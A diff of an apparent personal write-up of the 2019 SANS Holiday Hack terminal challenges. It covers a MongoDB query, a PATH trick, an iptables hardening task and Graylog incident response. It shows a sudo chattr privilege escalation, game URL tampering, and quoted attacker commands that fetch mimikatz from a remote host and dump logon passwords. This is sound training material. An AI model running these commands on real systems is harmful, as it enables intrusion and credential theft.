@@ -3,22 +3,15 @@ MongoDB
 From: Holly Evergreen
 MongoDB Documentation - https://docs.mongodb.com/manual/reference/command/listDatabases/#dbcmd.listDatabases
 
-Hey! It's me, Holly Evergreen! My teacher has been locked out of the quiz database and can't remember the right solution.
+Talk
+Hey! It's me, Holly Evergreen! My teacher has been locked out of the quiz database and can't
+remember the right solution.
 Without access to the answer, none of our quizzes will get graded.
 Can we help get back in to find that solution?
 I tried lsof -i, but that tool doesn't seem to be installed.
 I think there's a tool like ps that'll help too. What are the flags I need?
 Either way, you'll need to know a teensy bit of Mongo once you're in.
 Pretty please find us the solution to the quiz!
-
-Hey! It's me, Holly Evergreen! My teacher has been locked out of the quiz database and can't remember the right solution.
-Without access to the answer, none of our quizzes will get graded.
-Can we help get back in to find that solution?
-I tried lsof -i, but that tool doesn't seem to be installed.
-I think there's a tool like ps that'll help too. What are the flags I need?
-Either way, you'll need to know a teensy bit of Mongo once you're in.
-Pretty please find us the solution to the quiz!
-
 
 elf@50bb2734f7c5:~$ sudo -l
 User elf may run the following commands on 50bb2734f7c5:
@@ -48,6 +41,9 @@ solution
 system.js
 tackle
 tincan
+
+Tried several commands. One of the interestting command was db.<collection_name>.find().
+Tried this command on all of the collections. One of that that gave some results.
 > db.solution.find()
 { "_id" : "You did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **" }
 > db.loadServerScripts();displaySolution();
@@ -308,6 +304,7 @@ Linux Path (Linux Path)
 From: SugarPlum Mary
 Green words matter, files must be found, and the terminal's $PATH matters.
 
+Talk
 Oh there they are! Now I can delete them. Thanks!
 Have you tried the Sysmon and EQL challenge?
 If you aren't familiar with Sysmon, Carlos Perez has some great info about it.
@@ -322,10 +319,55 @@ Event Query Language
 From: SugarPlum Mary
 EQL Threat Hunting - https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/
 
+Once login to the terminal below meesage is shown:
 
-sudo -l
-chattr
-lsattr
+I need to list files in my home/
+To check on project logos
+But what I see with ls there,
+Are quotes from desert hobos...
+
+which piece of my command does fail?
+I surely cannot find it.
+Make straight my path and locate that-
+I'll praise your skill and sharp wit!
+
+Get a listing (ls) of your current directory.
+elf@7d679a34d7ba:~$ ls
+This isn't the ls you're looking for
+elf@7d679a34d7ba:~$ which ls
+/usr/local/bin/ls
+elf@7d679a34d7ba:~$ find / -name ls
+/usr/local/bin/ls
+find: '/root': Permission denied
+find: '/var/cache/apt/archives/partial': Permission denied
+find: '/var/cache/ldconfig': Permission denied
+find: '/var/lib/apt/lists/partial': Permission denied
+/bin/ls
+find: '/proc/tty/driver': Permission denied
+find: '/proc/1/task/1/fd': Permission denied
+find: '/proc/1/task/1/fdinfo': Permission denied
+find: '/proc/1/task/1/ns': Permission denied
+find: '/proc/1/fd': Permission denied
+find: '/proc/1/map_files': Permission denied
+find: '/proc/1/fdinfo': Permission denied
+find: '/proc/1/ns': Permission denied
+find: '/proc/6/task/6/fd': Permission denied
+find: '/proc/6/task/6/fdinfo': Permission denied
+find: '/proc/6/task/6/ns': Permission denied
+find: '/proc/6/fd': Permission denied
+find: '/proc/6/map_files': Permission denied
+find: '/proc/6/fdinfo': Permission denied
+find: '/proc/6/ns': Permission denied
+find: '/etc/ssl/private': Permission denied
+elf@7d679a34d7ba:~$ /bin/ls
+' '   rejected-elfu-logos.txt
+Loading, please wait......
+
+
+
+You did it! Congratulations!
+
+elf@7d679a34d7ba:~$ 
 ---------------Done---------------
 
 Deep Blue CLI on Github
@@ -351,6 +393,114 @@ On Linux, a user's shell is determined by the contents of /etc/passwd
 Chatter? (Nyanshell)
 From: Alabaster Snowball
 sudo -l says I can run a command as root. What does it do?
+
+Below is the message displayed after logging in to the terminal
+
+nanyancat, nyancat
+I love that nyancat!
+My shell's stuffed inside one
+Whatcha' think about that?
+
+Sadly now, the day's gone
+Things to do!  Without one...
+I'll miss that nyancat
+Run commands, win, and done!
+
+Log in as the user alabaster_snowball with a password of Password2, and land in a Bash prompt.
+
+Target Credentials:
+
+username: alabaster_snowball
+password: Password2
+elf@7fb2241eccd1:~$ sudo -l
+Matching Defaults entries for elf on 7fb2241eccd1:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User elf may run the following commands on 7fb2241eccd1:
+    (root) NOPASSWD: /usr/bin/chattr
+elf@7fb2241eccd1:~$
+
+This means that /usr/bin/chattr command is allowed for the current user
+
+elf@7fb2241eccd1:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+elf:x:1000:1000::/home/elf:/bin/bash
+alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
+elf@7fb2241eccd1:~$ 
+
+Here it shows that alabaster has different bash i.e. /bin/nsh then regular /bin/bash
+If we could change this??
+But this files doesn't have permission
+
+elf@7fb2241eccd1:~$ ls -ltr /bin/*sh
+-rwxr-xr-x 1 root root  121464 Jan 17  2019 /bin/dash
+lrwxrwxrwx 1 root root       4 Apr 18  2019 /bin/rbash -> bash
+-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+-rwxrwxrwx 1 root root   75680 Dec 11 17:40 /bin/nsh
+lrwxrwxrwx 1 root root       4 Dec 13 19:43 /bin/sh -> bash
+elf@7fb2241eccd1:~$ 
+
+elf@7fb2241eccd1:~$ cd /bin
+elf@7fb2241eccd1:/bin$ cp bash nsh
+cp: cannot create regular file 'nsh': Operation not permitted
+elf@7fb2241eccd1:/bin$ 
+
+At this point of time thought about "sudo -l" output. chattr command, what does it do?
+Searching that gave me "lsattr" command
+
+elf@7fb2241eccd1:/bin$ lsattr *sh
+--------------e---- bash
+--------------e---- dash
+----i---------e---- nsh
+lsattr: Operation not supported While reading flags on rbash
+lsattr: Operation not supported While reading flags on sh
+elf@7fb2241eccd1:/bin$ 
+
+The "i" in nsh file means that this file is immtable or cannot be modified.
+What about changing it. now "chattr" comes into picture.
+
+elf@7fb2241eccd1:/bin$ chattr -i nsh
+chattr: Permission denied while setting flags on nsh
+elf@7fb2241eccd1:/bin$ sudo chattr -i nsh
+elf@7fb2241eccd1:/bin$ lsattr *sh
+--------------e---- bash
+--------------e---- dash
+--------------e---- nsh
+lsattr: Operation not supported While reading flags on rbash
+lsattr: Operation not supported While reading flags on sh
+elf@7fb2241eccd1:/bin$ cp bash nsh
+elf@7fb2241eccd1:/bin$ 
+
+Now try logging to alabaster account
+
+elf@7fb2241eccd1:/bin$ su - alabaster_snowball 
+Password: 
+Loading, please wait......
+
+
+
+You did it! Congratulations!
+
+alabaster_snowball@7fb2241eccd1:~$ 
 ---------------Done---------------
 
 
@@ -358,6 +508,80 @@ sudo -l says I can run a command as root. What does it do?
 Iptables (smart braces)
 From: Kent Tinseltooth
 Iptables - https://upcloud.com/community/tutorials/configure-iptables-centos/
+
+Once you login to the terminal, following messages are displayed:
+Inner Voice: Kent. Kent. Wake up, Kent.
+Inner Voice: I'm talking to you, Kent.
+Kent TinselTooth: Who said that? I must be going insane.
+Kent TinselTooth: Am I?
+Inner Voice: That remains to be seen, Kent. But we are having a conversation.
+Inner Voice: This is Santa, Kent, and you've been a very naughty boy.
+Kent TinselTooth: Alright! Who is this?! Holly? Minty? Alabaster?
+Inner Voice: I am known by many names. I am the boss of the North Pole. Turn to me and be hired after graduation.
+Kent TinselTooth: Oh, sure.
+Inner Voice: Cut the candy, Kent, you've built an automated, machine-learning, sleigh device.
+Kent TinselTooth: How did you know that?
+Inner Voice: I'm Santa - I know everything.
+Kent TinselTooth: Oh. Kringle. *sigh*
+Inner Voice: That's right, Kent. Where is the sleigh device now?
+Kent TinselTooth: I can't tell you.
+Inner Voice: How would you like to intern for the rest of time?
+Kent TinselTooth: Please no, they're testing it at srf.elfu.org using default creds, but I don't know more. It's classified.
+Inner Voice: Very good Kent, that's all I needed to know.
+Kent TinselTooth: I thought you knew everything?
+Inner Voice: Nevermind that. I want you to think about what you've researched and studied. From now on, stop playing with your teeth, and floss more.
+*Inner Voice Goes Silent*
+
+Kent TinselTooth: Oh no, I sure hope that voice was Santa's.
+Kent TinselTooth: I suspect someone may have hacked into my IOT teeth braces.
+Kent TinselTooth: I must have forgotten to configure the firewall...
+Kent TinselTooth: Please review /home/elfuuser/IOTteethBraces.md and help me configure the firewall.
+Kent TinselTooth: Please hurry; having this ribbon cable on my teeth is uncomfortable.
+elfuuser@0866a92d7a22:~$ 
+
+And in the exercise, the termial will be closed in 5 mins. So make it count!!!!
+
+elfuuser@0866a92d7a22:~$ sudo -l
+Matching Defaults entries for elfuuser on 0866a92d7a22:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User elfuuser may run the following commands on 0866a92d7a22:
+    (ALL) NOPASSWD: /sbin/iptables
+elfuuser@0866a92d7a22:~$ ls
+IOTteethBraces.md
+elfuuser@0866a92d7a22:~$ cat IOTteethBraces.md
+# ElfU Research Labs - Smart Braces
+### A Lightweight Linux Device for Teeth Braces
+### Imagined and Created by ElfU Student Kent TinselTooth
+
+This device is embedded into one's teeth braces for easy management and monitoring of dental status. It uses FTP and HTTP for management and monitoring purposes but also has SSH for remote access. Please refer to the management documentation for this purpose.
+
+## Proper Firewall configuration:
+
+The firewall used for this system is `iptables`. The following is an example of how to set a default policy with using `iptables`:
+
+```
+sudo iptables -P FORWARD DROP
+```
+
+The following is an example of allowing traffic from a specific IP and to a specific port:
+
+```
+sudo iptables -A INPUT -p tcp --dport 25 -s 172.18.5.4 -j ACCEPT
+```
+
+A proper configuration for the Smart Braces should be exactly:
+
+1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
+2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.
+3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).
+4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.
+5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
+6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.
+elfuuser@0866a92d7a22:~$ 
+
+So, here the rules are given, just need to write it and enter
 
 1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
 sudo iptables -P INPUT DROP
@@ -380,6 +604,21 @@ sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
 
 6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.
 sudo iptables -A INPUT -i lo -j ACCEPT
+
+elfuuser@0866a92d7a22:~$ sudo iptables -P INPUT DROP
+elfuuser@0866a92d7a22:~$ sudo iptables -P FORWARD DROP
+elfuuser@0866a92d7a22:~$ sudo iptables -P OUTPUT DROP
+elfuuser@0866a92d7a22:~$ sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+elfuuser@0866a92d7a22:~$ sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+elfuuser@0866a92d7a22:~$ sudo iptables -A INPUT -s 172.19.0.225 -p tcp --dport 22 -j ACCEPT
+elfuuser@0866a92d7a22:~$ sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
+elfuuser@0866a92d7a22:~$ sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+elfuuser@0866a92d7a22:~$ sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
+elfuuser@0866a92d7a22:~$ sudo iptables -A INPUT -i lo -j ACCEPT
+elfuuser@0866a92d7a22:~$ Kent TinselTooth: Great, you hardened my IOT Smart Braces firewall!
+
+
+/usr/bin/inits: line 10:  1032 Killed                  su elfuuser
 ---------------Done---------------
 
 ---------------Done---------------
@@ -402,12 +641,13 @@ Event IDs and Sysmon
 From: Pepper Minstix
 (Events and Sysmon)
 
+Talk
 It's me - Pepper Minstix.
 Normally I'm jollier, but this Graylog has me a bit mystified.
-Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala.
+Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB,
+and Scala.
 Some Elf U computers were hacked, and I've been tasked with performing incident response.
 Can you help me fill out the incident response report using our instance of Graylog?
-
 It's probably helpful if you know a few things about Graylog.
 Event IDs and Sysmon are important too. Have you spent time with those?
 Don't worry - I'm sure you can figure this all out for me!
@@ -415,12 +655,130 @@ Don't worry - I'm sure you can figure this all out for me!
 Click on the All messages Link to access the Graylog search interface!
 Make sure you are searching in all messages!
 
-The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner.
+The Elf U Graylog server has an integrated incident response reporting system.
+Just mouse-over the box in the lower-right corner.
 Login with the username elfustudent and password elfustudent.
 
 
-cmd.exe /c "sc query type= service  "
-cmd.exe /c "Get-Service "
+ElfU Graylog Incident Response Report
+
+Graylog Login:
+elfustudent/elfustudent.
+
+Question 1:
+Minty CandyCane reported some weird activity on his computer after he clicked on a link in
+Firefox for a cookie recipe and downloaded a file.
+What is the full-path + filename of the first malicious file downloaded by Minty?
+Answer: Initialy search with "cookie" keyword but didn't give anything even after
+trying several option with that. Then I searched for "minty" and it gave me several
+files and one of them worked.
+Answer: C:\Users\minty\Downloads\cookie_recipe.exe 
+We can find this searching for sysmon file creation event id 2 with a process named
+firefox.exe and not junk .temp files. We can use regular expressions to include or
+exclude patterns:
+TargetFilename:/.+\.pdf/
+
+Question 2:
+The malicious file downloaded and executed by Minty gave the attacker remote access
+to his machine. What was the ip:port the malicious file connected to first?
+Answer: By now we know that this file "cookie_recipe.exe" is malicious and using
+this remote access was done. So, destination IP should be present in the query.
+search query "cookie_recipe.exe AND _exists_:DestinationIp"
+Answer: 192.168.247.175:4444 
+We can pivot off the answer to our first question using the binary path as our ProcessImage.
+ 
+Question 3:
+What was the first command executed by the attacker?
+(answer is a single word)
+Answer: Again same strategy. adding command line with the file. This gave 19 results.
+Seeing them carefully, gave the command
+search query: cookie_recipe.exe AND _exists_:ParentProcessCommandLine
+Answer: whoami 
+Since all commands (sysmon event id 1) by the attacker are initially running through
+the cookie_recipe.exe binary, we can set its full-path as our ParentProcessImage to
+find child processes it creates sorting on timestamp.
+
+Question 4:
+What is the one-word service name the attacker used to escalate privileges?
+Answer: In continuation with earlier query, we notice that attacker further downloaded
+cookie_recipe2.exe at 2019-11-19 05:28:32.000.
+Using this file, command with "webexservice" was executed 
+search query: cookie_recipe.exe AND _exists_:ParentProcessCommandLine
+Answer: webexservice 
+Continuing on using the cookie_reciper.exe binary as our ParentProcessImage, we
+should see some more commands later on related to a service.
+
+Question 5:
+What is the file-path + filename of the binary ran by the attacker to dump credentials?
+Answer: We know cookie_recipe2.exe was downloaded at 2019-11-19 05:28:32, so narrowing
+down our search after this only. This leaves us with 4208 message. Also adding command
+exist parameter in query. Now 468 events :)
+Noticed some interesting command, another download.
+C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20190813/mimikatz_trunk.zip -OutFile cookie.zip " at 2019-11-19 05:35:25.000
+C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe " at 2019-11-19 05:41:02.000
+and few others.
+and then finally this command was executed.
+C:\cookie.exe" privilege::debug sekurlsa::logonpasswords exit at 2019-11-19 05:45:15.000
+Answer: C:\cookie.exe 
+The attacker elevates privileges using the vulnerable webexservice to run a file
+called cookie_recipe2.exe. Let's use this binary path in our ParentProcessImage search.
+
+Question 6:
+The attacker pivoted to another workstation using credentials gained from Minty's
+computer. Which account name was used to pivot to another machine?
+Answer: This was easy. Just searched and found that eventID:4624 is related to Windows logon.
+Query Search: 4624
+Answer: alabaster 
+Windows Event Id 4624 is generated when a user network logon occurs successfully.
+We can also filter on the attacker's IP using SourceNetworkAddress.
+
+Question 7:
+What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?
+Answer: Searching at the same query "4624" and refering to page
+(https://eventlogxp.com/blog/logon-type-what-does-it-mean/) logon type=10 is of interest.
+The first event is at 2019-11-19 06:04:28.000
+Answer: 06:04:28 
+LogonType 10 is used for successful network connections using the RDP client.
+
+Question 8:
+
+The attacker navigates the file system of a third host using their Remote Desktop
+Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType
+of this connection? (submit in that order as csv)
+Answer: This event has to be occurred only after 06:04:28. Let's see how many events
+are there after this time. 1114, still high number, let's reduce it further down.
+what we already know is that the source name should be elfu-res-wks2, becasue this was the
+system where attacker logged in using RDP. Let's check events with this source.
+The logontype shuold be "3" for Network type (https://eventlogxp.com/blog/logon-type-what-does-it-mean/)
+First such event at 2019-11-19 06:07:22.000 gave the clue
+Answer: elfu-res-wks2,elfu-res-wks3,3 
+The attacker has GUI access to workstation 2 via RDP. They likely use this GUI connection
+to access the file system of of workstation 3 using explorer.exe via UNC file
+paths (which is why we don't see any cmd.exe or powershell.exe process creates). However, we
+still see the successful network authentication for this with event id 4624 and logon type 3.
+
+Question 9:
+What is the full-path + filename of the secret research document after being transferred
+from the third host to the second host?
+Answer: Searching for all the evnts after "2019-11-19 06:07:22" give 445 events remaining.
+Still many :(. So, added parameter "_exists_:CommandLine" in search. 21 events now :)
+keeping source and destination in mind, we found at 2019-11-19 06:14:24.000, 
+C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf as the file we need.
+Answer: C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf 
+We can look for sysmon file creation event id of 2 with a source of workstation 2.
+We can also use regex to filter out overly common file paths using something like:
+AND NOT TargetFilename:/.+AppData.+/
+
+Question 10:
+What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?
+Answer: After "2019-11-19 06:14:24.000" only 3 events remaining, so,
+its easy to find IP for pastebin.com i.e. 
+Answer: 104.22.3.84 
+We can look for the original document in CommandLine using regex.
+When we do that, we see a long a long PowerShell command using Invoke-Webrequest to
+a remote URL of https://pastebin.com/post.php. We can pivot off of this information to
+look for a sysmon network connection id of 3 with a source of elfu-res-wks2 and
+DestinationHostname of pastebin.com.
 ---------------Done---------------
 
 
@@ -437,7 +795,8 @@ If you get stuck at all, check out this year's talks.
 One is about web application penetration testing.
 Good luck, and don't get dysentery!
 
-After basic setup, notice that game is cover the distance. And we can manually change distance. I directly changed it to 7900, and remaining covered by game button "Go"
+After basic setup, notice that game is cover the distance. And we can manually change
+distance. I directly changed it to 7900, and remaining covered by game button "Go"
 hhc://trail.hhc/trail/?difficulty=0&distance=7900&money=1000&pace=0&curmonth=7&curday=4&reindeer=6&runners=12&ammo=100&meds=20&food=376&name0=Mildred&health0=100&cond0=0&causeofdeath0=&deathday0=0&deathmonth0=0&name1=Anna&health1=100&cond1=0&causeofdeath1=&deathday1=0&deathmonth1=0&name2=Sally&health2=100&cond2=0&causeofdeath2=&deathday2=0&deathmonth2=0&name3=Chris&health3=100&cond3=0&causeofdeath3=&deathday3=0&deathmonth3=0
 ---------------Done---------------
 
@@ -453,3 +812,23 @@ He even has a collection of key bitting templates for common vendors like Kwikse
 
 Ctrl-Shift-J -> find Deviant Ollam, Optical Decoding of Keys | KringleCon 2019
 
+
+At this point of time, I know I am done with all of the open exercises.
+But still some more remaining becasue "Narrative" is not yet complete.
+And mostly the way to unlock rest of them is the key.
+
+But I am dropping of now. Enough for the first time I guess!!!! :)
+
+Great Learnings:
+- GrayLog
+- MongoDB
+- Splunk
+- Linux
+    * sudo -l
+    * chattr
+    * lsattr
+- PowerShell
+    * Get-ChildItem (gci)
+    * Get-Content (gc)
+    * Get-Process
+    * Stop-Process
